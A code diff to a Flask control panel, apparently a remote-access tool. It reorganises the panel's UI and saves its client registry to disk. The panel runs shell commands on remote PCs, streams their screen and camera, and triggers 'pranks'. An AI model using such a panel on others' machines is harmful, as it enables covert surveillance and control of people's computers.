@@ -2320,7 +2320,7 @@ textarea{width:100%;background:#000;color:var(--neon);border:1px solid var(--bor
 /* ===== LAYOUT ===== */
 .layout{
   display:grid;
-  grid-template-columns:1fr 340px;
+  grid-template-columns:1fr;
   height:100vh;
 }
 
@@ -2381,6 +2381,17 @@ canvas{
   width:100%;
   height:60px;
 }
+canvas{
+  width:100%;
+  height:60px;
+}
+.collapsible-body{overflow:hidden;max-height:3000px;transition:max-height .22s ease,opacity .18s ease;opacity:1}
+.collapsible-body.hidden{max-height:0;opacity:0;pointer-events:none}
+.collapse-btn{padding:5px 9px;border:1px solid var(--border);background:transparent;color:var(--neon);border-radius:7px;cursor:pointer}
+.device-table{width:100%;border-collapse:collapse;font-size:13px}
+.device-table th,.device-table td{padding:7px 5px;border-bottom:1px solid var(--border);text-align:left}
+.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;margin-right:5px}
+.status-dot.off{background:#64748b}
 
 /* ===== SHELL ===== */
 .shell-switch{
@@ -2541,12 +2552,37 @@ input[type=range]::-webkit-slider-thumb {
 
 <div class="layout">
   <div class="main">
-    <div class="card">
-      <img src="{{ url_for('screen_feed', cid=selected_client_id) }}" class="screen">
+    <div class="card" id="devices-card">
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:8px">
+        <b>💻 Всі ПК</b>
+        <span class="badge">{{ clients|selectattr("online")|list|length }} online / {{ clients|length }} total</span>
+      </div>
+      <div style="margin-top:10px" class="collapsible-body">
+        <table class="device-table">
+          <thead><tr><th>Назва</th><th>IP</th><th>Статус</th><th>Last seen</th><th></th></tr></thead>
+          <tbody>
+          {% for pc in clients %}
+            <tr>
+              <td>{{ pc.name }}</td>
+              <td>{{ pc.ip }}</td>
+              <td><span class="status-dot {{ 'off' if not pc.online else '' }}"></span>{{ 'Online' if pc.online else 'Offline' }}</td>
+              <td>{{ pc.last_seen_text }}</td>
+              <td>{% if pc.online %}<form method="POST" action="{{ url_for('_select_client') }}"><input type="hidden" name="cid" value="{{ pc.id }}"><input type="hidden" name="next" value="{{ url_for('index') }}"><button class="collapse-btn" type="submit">{{ 'Обрано' if pc.id == selected_client_id else 'Вибрати' }}</button></form>{% endif %}</td>
+            </tr>
+          {% else %}<tr><td colspan="5">Немає зареєстрованих ПК.</td></tr>{% endfor %}
+          </tbody>
+        </table>
+      </div>
     </div>
 
-    <div class="card">
-      <b>Command</b>
+    <div class="card collapsible">
+      <div class="stat-header"><b>🖥 Демонстрація</b><button class="collapse-btn" type="button" onclick="toggleBlock('screenBlock',this)">Сховати</button></div>
+      <div id="screenBlock" class="collapsible-body"><img src="{{ url_for('screen_feed', cid=selected_client_id) }}" class="screen"></div>
+    </div>
+
+    <div class="card collapsible">
+      <div class="stat-header"><b>Command</b><button class="collapse-btn" type="button" onclick="toggleBlock('commandBlock',this)">Сховати</button></div>
+      <div id="commandBlock" class="collapsible-body">
       <form method="POST" action="{{ url_for('run_cmd_route') }}">
         <textarea name="cmd"></textarea>
         <input type="hidden" name="shell" id="shellInput" value="cmd">
@@ -2559,6 +2595,7 @@ input[type=range]::-webkit-slider-thumb {
         <button class="btn" style="margin-top:8px">Run</button>
       </form>
       <pre>{{ cmd_output or "—" }}</pre>
+      </div>
     </div>
     <div class="card">
   <b>🔊 Гучність</b>
@@ -2579,51 +2616,27 @@ input[type=range]::-webkit-slider-thumb {
   </div>
 
   <div class="right">
-    <div class="card" id="devices-card">
-      <div style="display:flex;justify-content:space-between;align-items:center;gap:8px">
-        <b>💻 Devices</b>
-        <span class="badge">{{ clients|selectattr("online")|list|length }} online / {{ clients|length }} total</span>
+    <div class="card collapsible">
+      <div class="stat-header">
+        <span>CPU <span id="cpuVal">{{ cpu }}%</span></span>
+        <button class="collapse-btn" type="button" onclick="toggleBlock('cpuBlock',this)">Сховати</button>
       </div>
-      <div style="margin-top:10px">
-        {% for pc in clients %}
-        <div class="client-row {% if pc.id == selected_client_id %}selected{% endif %}" style="margin-bottom:8px;padding:9px;border:1px solid var(--border);border-radius:8px">
-          <div style="display:flex;justify-content:space-between;gap:8px">
-            <b>{{ pc.name }}</b>
-            <span class="badge"><span class="dot {{ '' if pc.online else 'off' }}"></span>{{ 'Online' if pc.online else 'Offline' }}</span>
-          </div>
-          <div class="small" style="margin-top:4px">{{ pc.ip }} · {{ pc.id }}</div>
-          <div class="small" style="margin-top:3px">Caps: {{ ', '.join(pc.caps) or '—' }}</div>
-          {% if pc.online %}
-          <form method="POST" action="{{ url_for('_select_client') }}" style="margin-top:7px">
-            <input type="hidden" name="cid" value="{{ pc.id }}">
-            <input type="hidden" name="next" value="{{ url_for('index') }}">
-            <button class="btn" type="submit">{{ 'Selected' if pc.id == selected_client_id else 'Select' }}</button>
-          </form>
-          {% endif %}
-        </div>
-        {% else %}
-        <div class="small">No z16 clients connected.</div>
-        {% endfor %}
+      <div id="cpuBlock" class="collapsible-body">
+        <div class="bar"><div id="cpuBar"></div></div>
+        <canvas id="cpuChart" width="320" height="60"></canvas>
       </div>
     </div>
 
-    <div class="card">
+    <div class="card collapsible">
       <div class="stat-header">
-        CPU <span id="cpuVal">{{ cpu }}%</span>
+        <span>RAM <span id="ramVal">{{ ram }}%</span></span>
+        <button class="collapse-btn" type="button" onclick="toggleBlock('ramBlock',this)">Сховати</button>
       </div>
-      <div class="bar"><div id="cpuBar"></div></div>
-      <canvas id="cpuChart" width="320" height="60"></canvas>
+      <div id="ramBlock" class="collapsible-body">
+        <div class="bar"><div id="ramBar"></div></div>
+        <canvas id="ramChart" width="320" height="60"></canvas>
+      </div>
     </div>
-
-    <div class="card">
-      <div class="stat-header">
-        RAM <span id="ramVal">{{ ram }}%</span>
-      </div>
-      <div class="bar"><div id="ramBar"></div></div>
-      <canvas id="ramChart" width="320" height="60"></canvas>
-      
-    
-  </div>
   <div class="right-panel">
   <h3 style="color:#e5e7eb; margin-bottom:10px;">
     🎭 Пранки
@@ -2747,6 +2760,13 @@ function setShell(v,b){
   b.classList.add('active');
 }
 
+function toggleBlock(id, btn){
+  const el=document.getElementById(id);
+  if(!el)return;
+  const hidden=el.classList.toggle('hidden');
+  btn.textContent=hidden?'Показати':'Сховати';
+}
+
 const cpuCtx=document.getElementById("cpuChart").getContext("2d");
 const ramCtx=document.getElementById("ramChart").getContext("2d");
 const cpuBar=document.getElementById("cpuBar");
@@ -2767,7 +2787,11 @@ function draw(ctx,data){
   ctx.stroke();
 }
 
+let updateBusy=false;
 async function update(){
+  if(updateBusy)return;
+  updateBusy=true;
+  try {
   const r=await fetch("/api/system",{cache:"no-store"});
   if(!r.ok)return;
   const d=await r.json();
@@ -2783,9 +2807,11 @@ async function update(){
 
   draw(cpuCtx,cpuData);
   draw(ramCtx,ramData);
+  } catch(e) { /* server temporarily unavailable */ } finally { updateBusy=false; }
 }
 
-setInterval(update,500);
+update();
+setInterval(update,1500);
 function startDisco(){
   const sec = document.getElementById("discoSec").value;
   fetch("/prank/disco?sec=" + sec);
@@ -3844,6 +3870,46 @@ img.addEventListener("mousemove", function(e){
 # ---------------------------------------------------------------------------
 REMOTE_CLIENTS: dict[str, dict[str, Any]] = {}
 REMOTE_LOCK = threading.RLock()
+CLIENTS_FILE = str(DATA_ROOT / "clients.json")
+
+def _load_client_registry():
+    try:
+        with open(CLIENTS_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        if isinstance(data, dict):
+            for cid, c in data.items():
+                if isinstance(c, dict):
+                    c.setdefault("jobs", [])
+                    c.setdefault("results", {})
+                    c.setdefault("screen_frame", None)
+                    c.setdefault("camera_frame", None)
+                    REMOTE_CLIENTS[str(cid)] = c
+    except Exception:
+        pass
+
+def _save_client_registry():
+    try:
+        with REMOTE_LOCK:
+            clean = {}
+            for cid, c in REMOTE_CLIENTS.items():
+                clean[cid] = {k:v for k,v in c.items() if k not in {"jobs", "results", "screen_frame", "camera_frame"}}
+        tmp = CLIENTS_FILE + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(clean, f, ensure_ascii=False, indent=2)
+        os.replace(tmp, CLIENTS_FILE)
+    except Exception:
+        pass
+
+_load_client_registry()
+
+
+def _last_seen_text(ts: float) -> str:
+    if not ts:
+        return "—"
+    try:
+        return datetime.datetime.fromtimestamp(float(ts)).strftime("%Y-%m-%d %H:%M:%S")
+    except Exception:
+        return "—"
 
 def _client_online(c: dict[str, Any]) -> bool:
     return (time.time() - float(c.get("last_seen", 0))) < ONLINE_TTL
@@ -3932,6 +3998,7 @@ def _remote_heartbeat():
         c["stream_camera"] = (time.time() - c.get("camera_viewed", 0)) < 3
         jobs = list(c.get("jobs", []))
         c["jobs"] = []
+    _save_client_registry()
     return jsonify(stream_screen=bool(c.get("stream_screen")), stream_camera=bool(c.get("stream_camera")), commands=jobs, server_ts=current_ts())
 
 @app.get("/api/clients")
@@ -3946,6 +4013,7 @@ def _api_clients():
                 "ip": c.get("ip") or "?",
                 "online": _client_online(c),
                 "last_seen": float(c.get("last_seen", 0)),
+                "last_seen_text": _last_seen_text(c.get("last_seen", 0)),
                 "caps": sorted(set(c.get("caps") or [])),
                 "cpu": c.get("cpu"),
                 "ram": c.get("ram"),
@@ -4283,6 +4351,7 @@ def _adapt_index():
                 "ip": c.get("ip") or "?",
                 "online": _client_online(c),
                 "last_seen": float(c.get("last_seen", 0)),
+                "last_seen_text": _last_seen_text(c.get("last_seen", 0)),
                 "caps": sorted(set(c.get("caps") or [])),
                 "cpu": c.get("cpu"),
                 "ram": c.get("ram"),
